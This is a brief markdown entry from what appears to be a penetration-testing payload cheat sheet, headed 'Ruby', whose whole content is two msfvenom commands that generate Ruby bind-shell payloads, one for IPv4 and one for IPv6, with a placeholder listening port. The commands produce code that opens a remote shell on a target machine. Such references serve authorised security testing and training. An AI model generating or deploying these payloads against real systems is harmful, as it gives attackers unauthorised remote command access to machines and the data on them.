# Ruby

## 01 - Generate via `msfvenom`

```
$ msfvenom -p cmd/unix/bind_ruby lport=<PORT>

$ msfvenom -p cmd/unix/bind_ruby_ipv6 lport=<PORT>
```